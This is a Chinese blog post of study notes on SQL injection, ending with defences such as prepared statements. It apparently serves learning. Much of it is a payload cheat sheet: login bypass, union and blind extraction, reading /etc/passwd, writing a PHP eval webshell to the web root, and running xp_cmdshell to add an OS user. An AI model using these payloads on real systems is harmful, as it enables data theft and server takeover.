---
title: SQL注入学习
date: 2016-03-26 20:24:37
categories: 安全
tags: [Web安全,SQL注入]
---
## 一、原理
### 1.简介
SQL注入的原因主要是在SQL查询中，没有过滤用户输入的数据，导致输入的恶意代码被执行，从而产生漏洞。
如下的语句中
```php
$sql="SELECT * FROM user WHERE username='{$username}' AND password='{$password}'";
$mysqli_result=$mysqli->query($sql);
if($mysqli_result && $mysqli_result->num_rows>0){
	echo '登陆成功';
}else{
	echo '登陆失败';
}
```
<!--more-->
当输入正确用户时会显示登陆成功，否则会登陆失败。
但是当输入`admin' or 1=1# `密码随意时会登陆成功。这是因为输入后执行的SQL语句为
`SELECT * FROM user WHERE username='admin' or 1=1# ' AND password='xxx'`or 1=1永远为真，所以查询不起作用。
### 2.分类
SQL注入分为字符型和数字型。  
数字型注入即： www.xxx.com/index.php?id=1 之类的，带入数据库查询的是数字。  
字符型注入即： www.www.xxx.com/index.php?str=xxx ,带入数据库查询的是字符串。  
搜索型注入也是字符型注入的一种，一般在搜索框中。  
字符型注入需要闭合多余的引号以及注释多余的查询语句。  
此外,根据注入位置的不同，可分为get,cookie,post注入等方式。
盲注一般是指无法显示错误信息，需要加入参数，如延长时间来判断是否注入成功。  
## 二、注入语句
### 1.判断注入点
数字型：and 1=1 and 1=2 判断是否存在注入  
字符型：' and '1'='1 ' and '1'='2  
搜索型： 关键字%' and 1=1 and '%'='% 关键字%'   and 1=2 and '%'='%
### 2.MySql
**mysql注释:** `#`, `-- `,`/* */`。  
**空格:** `%20, %09, %0a, %0b, %0c, %0d, %a0`  
**内置函数：**
<table><thead><tr><th>函数</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td>system_user()</td><td style="text-align:left">系统用户名</td></tr><tr><td>user()</td><td style="text-align:left">用户名</td></tr><tr><td>current_user</td><td style="text-align:left">当前用户名</td></tr><tr><td>session_user()</td><td style="text-align:left">连接数据库的用户名</td></tr><tr><td>database()</td><td style="text-align:left">数据库名</td></tr><tr><td>version()</td><td style="text-align:left">MYSQL数据库版本</td></tr><tr><td>load_file()</td><td style="text-align:left">MYSQL读取本地文件的函数</td></tr><tr><td>@@datadir</td><td style="text-align:left">读取数据库路径</td></tr><tr><td>@@basedir</td><td style="text-align:left">MYSQL安装路径</td></tr><tr><td>@@version_compile_os</td><td style="text-align:left">操作系统信息</td></tr><tr><td>length</td><td style="text-align:left">返回字符串长度</td></tr><tr><td>substring</td><td style="text-align:left">截取字符串长度</td></tr><tr><td>ascii</td><td style="text-align:left">返回ASCII码</td></tr><tr><td>hex</td><td style="text-align:left">将字符串转换为16进制</td></tr><tr><td>concat</td><td style="text-align:left">字符串连接</td></tr><tr><td>CHAR</td><td style="text-align:left">将参数解释为整数并且返回由这些整数的ASCII代码字符组成的一个字符串。</td></tr></tbody></table>

**查询语句:**   
报字段长度：
-1' order by X  
字段位置：
-1' union select 1,2,3....  
查询数据库名称：
select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATE limit 0,1;  
information_schema这张数据表保存了MySQL服务器所有数据库的信息  
查询当前数据库表：
select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=数据库名(16进制) limit 0,1;  
查询指定表的所有字段：
select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=表名(16进制) limit 0,1;  
UNION查询：
union查询把多个select语句结果集合到一个结果中。  
**函数利用:**  
load_file() 读文件操作: 必须是绝对路径，拥有file权限，文件小于最小max_allowed_packet字节  
union select load_file('/etc/passwd')或者  
load_file(0x2F6574632F706173737764)或者  
load_file(char(47 101 116 99 47 112 97 115 115 119 100 ))绕过  
into outfile() 写文件操作:    
select '<?php @eval($_POST[value]);?>' into outfile 'c:\wwwroot\1.php' 或者  
select char(16进制一句话木马) into outfile 'c:\wwwroot\1.php'  
连接字符串:  
concat()函数  
select concat(user(),',',database(),',',version())
concat_ws()函数  
union select concat_ws(0x2c,user(),database(),version())  
**mysql报错注入:**  
1.updatexml函数  
2.extractvalue函数  
3.floor函数  
4.name_const()函数    
参考http://www.waitalone.cn/mysql-error-based-injection.html

**mysql宽字节注入：**    
当编码不统一时，可能造成宽字节注入
注入攻击中常常会输入单引号[']双引号["]等特殊字符，当开启magic_quotes_gpc或者使用addslashes()会使用转义字符[\]来转义这些特殊字符。
当使用宽字节时，0xbf5c和0xbf27会被看成时一个字符。输入0xbf27时，经过转义变成0xbf5c27 即[縗']，产生了单引号，就会突破PHP的转义。  
**延时注入:**  
mysql中有函数sleep()，可以指定秒数来运行语句，
查询当前用户，并取得字符串长度
and if(length(user())=x,sleep(3),1)  
格式 IF(Condition,A,B) 意义：当Condition为TRUE时，返回A；当Condition为FALSE时，返回B。  
x为数字，不断递增，判断user长度
截取字符串字符，转换为ASCII码，并判断。  
and if(hex(mid(user(),1,1))=1,sleep(3),1)
逐个进行比较  
and if(hex(mid(user(),L,1))=N,sleep(3),1)
//MID() 函数用于从文本字段中提取字符。    MID(column_name,start[,length])
column_name	必需。要提取字符的字段。
start	必需。规定开始位置（起始值是 1）。
length	可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。  
同样可以使用substr函数判断  
and if(substr(user(),1,1)='r',sleep(3),1)  
and if(substr(user(),2,1)='o',sleep(3),1)  
and if(substr(user(),3,1)='o',sleep(3),1)  
and if(substr(user(),4,1)='t',sleep(3),1)  
...  

### 3.MSSQL
**MSSQL注释:**   ``/* */``,``--``,``00%``空字节  
**MSSQL权限:**    
Sa  可以执行mssql数据库的所有操作  
db_owner  执行所有数据库角色活动  
public  维护所有默认权限  
**注入语句:**            
MSSQL版本: select @@VERSION        
获取用户名: and user>0      
数据库名: and db_name() >0      
and 1=(select IS_SRVROLEMEMBER('sysadmin')) //判断是否是系统管理员  
and 1=(select is_srvrolemember('db_owner') //判断是否是库权限  
and 1=(select is_srvrolemember('public') //判断是否为Public权限      
判断表单是否存在:
and exists(select * from 表名)    
判断列数:
order by x  
UNION查询判断字段数:
UNION SELECT null,null....  
逐渐递增，直到无错误产生。  
GROUP BY / HAVING 获​取当前查询的列名:   
获取第一个表名
and (select top 1 name from sysobjects where xtype='u')>0 (得到第一个表名:比如user)    
and (select top 1 name from sysobjects where xtype='u' and name not in ('user'))>0 得到第二个表名，后面的以此类推。  
猜解列名:  
用到系统自带的2个函数col_name()和object_id()，col_name()的格式是“COL_NAME( table_id , column_id )参数table_id是表的标识号，column_id是列的标识号，object_id(admin)就是得到admin在sysobjects 中的标识号，column_id=1,2,3表明admin的第1，2，3列。  
and (select top 1 col_name(object_id('admin'),1) from sysobjects)>0 【得到admin字段的第一个列名“username”依次类推，得到“password”“id”等等】  
猜解字段内容:  
and (select top 1 username from [admin])>0 【直接得到用户名】   
and (select top 1 password from [admin])>0 【直接得到密码】   
UNION联合查询：      
union select user,pwd,uid from 表名  
and 1=1 union select 1,2,3,4,5... from 表名 (数值从1开始慢慢加，如果加到5返回正常，那就存在5个字段)  

<table><thead><tr><th>函数</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td>stuff</td><td style="text-align:left">字符串截取函数</td></tr><tr><td>ascii</td><td style="text-align:left">取ASCII码</td></tr><tr><td>getdate</td><td style="text-align:left">返回日期</td></tr><tr><td>count</td><td style="text-align:left">返回组中的总条数</td></tr><tr><td>cast</td><td style="text-align:left">将一种数据类型的表达式显示转换为另一种数据类型的表达式</td></tr><tr><td>rand</td><td style="text-align:left">返回随机值</td></tr></tbody></table>

**存储过程:**  
xp_xmdshell:  
and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype='X' AND
name='xp_cmdshell') //判断xp_cmdshell是否存在  
and 1=(select count(*) FROM master.dbo.sysobjects where
name= 'xp_regread') //查看xp_regread扩展存储过程是已被删除  
;exec sp_addextendedproc xp_cmdshell,'xplog70.dll' //恢复xp_cmdshell  
添加用户 exec xp_xmdshell 'net user test test/add'    

常见的存储过程：

<table><thead><tr><th>过程</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td>sp_addlogin</td><td style="text-align:left">创建新的SQL Server登录</td></tr><tr><td>xp_cmdshell</td><td style="text-align:left">它可以执行操作系统的任何指令</td></tr><tr><td>xp_dirtree</td><td style="text-align:left">用来列出对应目录下的文件和文件夹</td></tr><tr><td>xp_enumgroups</td><td style="text-align:left">列出当前系统的使用群组及其说明</td></tr><tr><td>xp_fixeddrives</td><td style="text-align:left">列表所有驱动器名和每个驱动器上的空闲空间大小</td></tr><tr><td>xp_loginconfig</td><td style="text-align:left">一些服务器安全配置的信息</td></tr><tr><td>xp_enumerrorlogs</td><td style="text-align:left">枚举域名相关信息</td></tr><tr><td>Xp_regdeletekey</td><td style="text-align:left">可以删除注册表指定的键</td></tr><tr><td>Xp_regdeletevalue</td><td style="text-align:left">可以删除注册表指定的键里指定的值</td></tr><tr><td>Xp_regread</td><td style="text-align:left">可以读取注册表指定的键里指定的值</td></tr><tr><td>Xp_regwrite</td><td style="text-align:left">可以写入注册表指定的键里指定的值</td></tr></tbody></table>
### 4.Oracle
获取元数据  
user_tablespaces视图，查看表空间  
select tablespace_name from user_tablespaces  
user_table视图，查看当前用户的所有表  
select table_name from user_tables where rownum=1  
user_tab_columns视图，查看当前用户的所有列  
select column_name from user_tab_columns where table_name ='user'  
all_user视图，查看Oracle数据库的所有用户  
select username from all_user  
user_objects视图，查看当前用户所有对象  
select object_name from user_objects  
查看当前用户的角色  
select * from user_role_privs;   

**查询语句**  
UNION 查询  
获取列数:
order by x  
获取敏感信息:
 1. 当前用户权限 （select * from session_roles）
 2. 当前数据库版本 （ select banner from sys.v_$version where rownum=1
 3. 服务器出口IP （用utl_http.request 可以实现）
 4. 服务器监听IP （select utl_inaddr.get_host_address from dual）
 5. 服务器操作系统 （select member from v$logfile where rownum=1）
 6. 服务器sid ( 远程连接的话需要， select instance_name fromv$instance;）
 7. 当前连接用户 （select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual）

通过查询元数据的方式，获取表名，列名后查询数据:
union select username,password，null from user--  
从user表中获取用户名和密码，列数为3，查询位置为1，2  
也可以枚举法猜解表名和列名。




## 三、防御SQL注入
### 1.过滤
以PHP为例，在接受参数时对其进行过滤。  
开启 magic_quotes_gpc和magic_quotes_runtime  
addslashes函数 $id=addslashes($_GET('id'))  
mysql_real_escape_string函数和mysql_escape_string函数  
或者使用黑名单方式进行过滤,如正则表达式  
### 2.严格的数据类型
例如在接受数字型时使用 is_numeric进行判断,使用intval进行字符转换或者ctype_digit()防止数字型注入

### 3.使用预编译语句
预编译语句在创建的时候
以PHP为例
```
$query="select *from user where username=?and password =?";
$stmt=$mysqli->prepare($query);
$stmt->bind_param("ss",$username,$password);
$username ="test";$password = "test";
$stmt->execute();
```
其它语言如java的prepareStatement,.NET的SqlParameter同样是预编译语句
### 4.存储过程
使用安全的存储过程，需要先将SQL语句定义在数据库中，避免动态拼接语句，否则也会存在注入问题


**参考：**
 - 《Web安全深度剖析》
 - http://drops.wooyun.org/tips/7299
 - http://www.myhack58.com/Article/html/3/7/2009/24338.htm
 - http://www.jb51.net/hack/41493.html
 - http://www.2cto.com/Article/201208/145297.html


 本来想深入学习一下SQL注入，顺便总结一下，写着写着发现要学的太多了，各种数据库注入，还有时间盲注，各种绕过技巧。很多还没语句还没搞清楚。
